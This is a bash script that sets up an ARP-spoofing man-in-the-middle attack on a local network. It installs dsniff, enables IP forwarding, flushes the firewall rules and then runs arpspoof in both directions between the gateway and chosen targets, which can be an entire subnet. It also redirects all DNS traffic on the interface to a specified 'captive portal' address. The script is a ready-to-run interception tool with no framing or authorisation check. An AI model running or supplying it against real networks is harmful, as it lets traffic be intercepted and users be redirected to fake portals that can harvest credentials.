#!/bin/bash

# Install required tools
apt-get install dsniff ipcalc -y

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush existing iptables rules
iptables -F
iptables -t nat -F

# Prompt user for input
read -p "Enter target IP(s) (comma-separated), or enter a CIDR subnet (e.g., 192.168.1.0/24), or type 'all': " TARGET_INPUT

read -p "Enter your interface (e.g., wlan0): " INTERFACE
read -p "Enter the gateway IP: " GATEWAY_IP
read -p "Enter your device IP on that subnet: " DEVICE_IP
read -p "Enter the captive portal IP: " PORTAL_IP

# Build IP list
TARGET_IPS=()

if [[ "$TARGET_INPUT" == *"/"* ]]; then
    # Subnet given, expand it using ipcalc
    NETWORK=$(ipcalc -n "$TARGET_INPUT" | awk -F: '/Network/ {print $2}' | xargs)
    BROADCAST=$(ipcalc -b "$TARGET_INPUT" | awk -F: '/Broadcast/ {print $2}' | xargs)
    
    IFS=. read -r i1 i2 i3 i4 <<< "$(echo $NETWORK)"
    IFS=. read -r b1 b2 b3 b4 <<< "$(echo $BROADCAST)"

    for i in $(seq $((i4 + 1)) $((b4 - 1))); do
        IP="$i1.$i2.$i3.$i"
        if [[ "$IP" != "$DEVICE_IP" && "$IP" != "$GATEWAY_IP" ]]; then
            TARGET_IPS+=("$IP")
        fi
    done
elif [[ "$TARGET_INPUT" == *","* ]]; then
    IFS=',' read -ra INPUTS <<< "$TARGET_INPUT"
    for ip in "${INPUTS[@]}"; do
        [[ "$ip" != "$DEVICE_IP" && "$ip" != "$GATEWAY_IP" ]] && TARGET_IPS+=("$ip")
    done
else
    [[ "$TARGET_INPUT" != "$DEVICE_IP" && "$TARGET_INPUT" != "$GATEWAY_IP" ]] && TARGET_IPS+=("$TARGET_INPUT")
fi

# Set iptables rules for captive portal redirection
iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 -j DNAT --to-destination "$PORTAL_IP"
iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 53 -j DNAT --to-destination "$PORTAL_IP"
iptables -t nat -A PREROUTING -i "$INTERFACE" -d 8.8.8.8 -p udp --dport 53 -j DNAT --to-destination "$PORTAL_IP"
iptables -t nat -A PREROUTING -i "$INTERFACE" -d "$PORTAL_IP" -j ACCEPT
iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE

# Launch arpspoof for each target
for ip in "${TARGET_IPS[@]}"; do
    echo "Spoofing: $ip"
    arpspoof -i "$INTERFACE" -t "$ip" "$GATEWAY_IP" &
    arpspoof -i "$INTERFACE" -t "$GATEWAY_IP" "$ip" &
done

echo "ARP spoofing and redirection setup complete."
